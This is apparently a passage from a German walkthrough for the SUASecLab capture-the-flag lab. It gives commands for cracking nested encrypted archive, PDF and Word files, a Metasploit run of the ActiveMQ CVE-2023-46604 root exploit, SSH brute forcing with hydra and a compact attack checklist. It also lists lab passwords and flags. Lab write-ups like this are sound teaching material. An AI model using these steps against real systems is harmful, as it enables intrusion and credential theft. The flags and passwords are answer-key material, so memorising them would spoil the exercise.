4) files.zip – mehrstufiges Knacken
-----------------------------------
Äußere ZIP-Verschlüsselung:
  fcrackzip -u -D -p 500-worst-passwords.txt files.zip
  # bekanntes Passwort (Build): startrek
  unzip -P startrek files.zip -d files_unzipped

Innere Dateien sind zusätzlich verschlüsselt (aus dem Build/Analyse):
  - files/pdf.pdf  -> PDF mit Benutzerpasswort (AES): super
  - files/word.docx (bzw. OLE/Office-Datei) -> Office-Passwort: porsche

Entsperren (Beispiele):
  # PDF
  pip3 install --user pikepdf
  python3 - <<'PY'
import pikepdf
pdf = pikepdf.open('files_unzipped/files/pdf.pdf', password='super')
pdf.save('pdf_decrypted.pdf')
PY

  # Word/OLE
  pip3 install --user msoffcrypto-tool
  python3 - <<'PY'
import msoffcrypto, io
with open('files_unzipped/files/word.docx','rb') as f:
    of = msoffcrypto.OfficeFile(f); of.load_key(password='porsche')
    with open('word_decrypted.docx','wb') as out: of.decrypt(out)
PY
  # Alternativ: pdfcrack/john/office2john je nach Tooling.

6) ActiveMQ (Port 61616) – RCE als root (Bonus)
-----------------------------------------------
- ActiveMQ 5.18.0, verwundbar: CVE-2023-46604 (RCE). Dienst läuft als root -> Root-Shell.
- Metasploit (Modulname auf Kali prüfen):
    msfconsole -q
    use exploit/multi/misc/apache_activemq_rce_cve_2023_46604
    set RHOSTS basic.suaseclab.de
    set RPORT 61616
    set SRVHOST <KALI_IP>
    set LHOST <KALI_IP>
    check
    run
- Bonus-Flag im Build-Kontext: CVE-2023-46604

7) Eigener TCP-Server (Port 10000)
----------------------------------
- Sendet/empfängt Daten im Klartext; Flags können per Wireshark mitgeschnitten werden.
- Manuell verbinden:
    nc basic.suaseclab.de 10000
    help   -> liefert Bonus-Flag (im Build: aaiN3qPY, Antwort "flag:aaiN3qPY")
    exit
- Kali-seitig läuft (im Lab) ein tcp_client (/opt/tcp_client), der periodisch Flags sendet
  (im Build u.a. FSe2GLGW, x5WdT8cZ, 6y6GCdnz) und sich zyklisch per Web einloggt.
- Wireshark: Interface wählen, Filter z.B. tcp.port == 10000, Traffic mitschneiden.

10) Schneller "alles Wichtige" Ablauf (kompakt)
-----------------------------------------------
1. nmap -sV -sC -p- <IP>
2. wget backup.sql, files.zip; fcrackzip/unzip (startrek) + innere Entschlüsselung (super/porsche)
3. mysql mit admin:cocacola / lms:ZDS6P4Mw -> information + jorani durchsuchen
4. nc <IP> 10000 -> help; Wireshark auf 10000
5. hydra/ssh mit users.txt + 500-worst (vagrant separat) -> mnickel (sudo) -> /home, /tmp/flags.txt
6. msfconsole -> ActiveMQ CVE-2023-46604 (root), Jorani CVE-2023-26469 suchen/ausnutzen
7. JuiceShop auf :8080 bearbeiten
8. Kali-lokale Flags unter ~ einsammeln

Hinweise
--------
- Flags/Passwörter können je nach Instanz/Reset variieren; nutze dies als Leitfaden und prüfe live.
- Einige Aktionen erfordern sudo auf Kali (nmap, wireshark) bzw. passende Tools (hydra, msfconsole, fcrackzip, gobuster).
- Nur im autorisierten SUASecLab-CTF/Labor verwenden.
